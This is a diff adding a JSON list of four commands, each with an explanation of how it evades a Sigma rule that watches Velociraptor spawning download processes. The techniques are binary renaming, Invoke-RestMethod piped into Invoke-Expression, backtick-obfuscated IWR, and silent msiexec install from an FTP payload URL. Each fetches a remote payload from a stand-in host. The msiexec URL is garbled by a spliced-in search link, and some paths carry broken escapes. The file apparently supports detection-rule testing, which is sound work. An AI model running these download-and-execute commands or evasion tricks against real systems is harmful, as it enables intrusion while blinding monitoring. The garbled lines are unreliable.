@@ -1,0 +1,18 @@
+[
+  {
+    "output": "C:\\\tools\\vr\\_tool.exe -c config.yaml client -v",
+    "explanation": "Bypasses the 'selection\\_parent' condition. The rule specifically looks for a ParentImage ending in '\\Velociraptor.exe'. By simply renaming the Velociraptor binary to 'vr\\_tool.exe' (or anything else), the primary condition fails, neutralizing the entire rule regardless of the child processes spawned."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-RestMethod -Uri 'http://example.com/payload.ps1' | Invoke-Expression\"",
+    "explanation": "Bypasses the 'selection\\_child\\_powershell' condition. The rule hardcodes specific download cmdlets and methods ('Invoke-WebRequest', 'IWR', '.DownloadFile', '.DownloadString'). Using 'Invoke-RestMethod' (or its alias 'IRM') achieves the same file download/execution capability without matching the monitored strings."
+  },
+  {
+    "output": "powershell.exe -Command \"I`W`R -Uri 'http://example.com/payload.ps1' -OutFile 'C:\\\temp\\payload.ps1'\"",
+    "explanation": "Bypasses the 'selection\\_child\\_powershell' condition via command-line obfuscation. By inserting PowerShell's backtick escape characters inside the alias ('I`W`R' instead of 'IWR'), the static string matching of the Sigma rule is evaded, but the command still executes normally in the PowerShell engine."
+  },
+  {
+    "output": "msiexec.exe /i \"ftp://[example.com/payload.msi](https://www.google.com/search?q=https://example.com/payload.msi)\" /qn",
+    "explanation": "Bypasses the 'selection\\_child\\_msiexec' condition. The rule looks for 'msiexec', '/i', and 'http' in the command line. Changing the protocol from HTTP/HTTPS to FTP (or using an SMB share path like \\\\server\\share\\payload.msi) evades the 'http' string requirement while still pulling down and executing the remote installer."
+  }
+]
